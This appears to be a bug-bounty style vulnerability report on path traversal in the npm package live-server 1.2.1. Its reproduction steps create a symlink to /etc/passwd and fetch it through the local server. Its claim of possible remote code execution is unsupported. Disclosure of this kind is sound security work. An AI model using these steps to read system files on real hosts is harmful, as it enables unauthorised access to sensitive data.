# :book: Description


 I would like to report path traversal vulnerability in live-server module
It allows an attacker to read system files via path traversal vulnerability.
This is a little development server with live reload capability. 

Module
-------------------------------------------
module name: live-server
version: 1.2.1
npm page: https://www.npmjs.com/package/live-server

# :recycle:  Steps To Reproduce-:  
1)Install the live-server module
$ npm install -g live-server

2)Make a directory
$ mkdir test

3)Go to 'test' directory
$ cd test

4)create a symlink file
ln -s /etc/passwd 'filename'

5)Run live-server module
$ live-server

6)Request the file within browser
http://localhost:3474/'filename'

# :telescope: POC
  https://imgur.com/a/rHGnsGK

## 💥 Impact
This could have enabled an attacker to view system files and leverage attacks like remote code execution and so on

## ✅ Checklist
- [x] _Created and populated the `README.md` and `vulnerability.json` files_
- [x] _Provided the repository URL and any applicable [permalinks]([https://help.github.com/en/github/managing-files-in-a-repository/getting-permanent-links-to-files](https://help.github.com/en/github/managing-files-in-a-repository/getting-permanent-links-to-files))_
- [x] _Defined all the applicable weaknesses ([CWEs]([https://cwe.mitre.org/](https://cwe.mitre.org/)))_
- [x] _Proposed the CVSS vector items i.e. User Interaction, Attack Complexity_
- [x] _Checked that the vulnerability affects the latest version of the package released_
- [x] _Checked that a fix does not currently exist that remediates this vulnerability_
- [x] _Complied with all applicable laws_
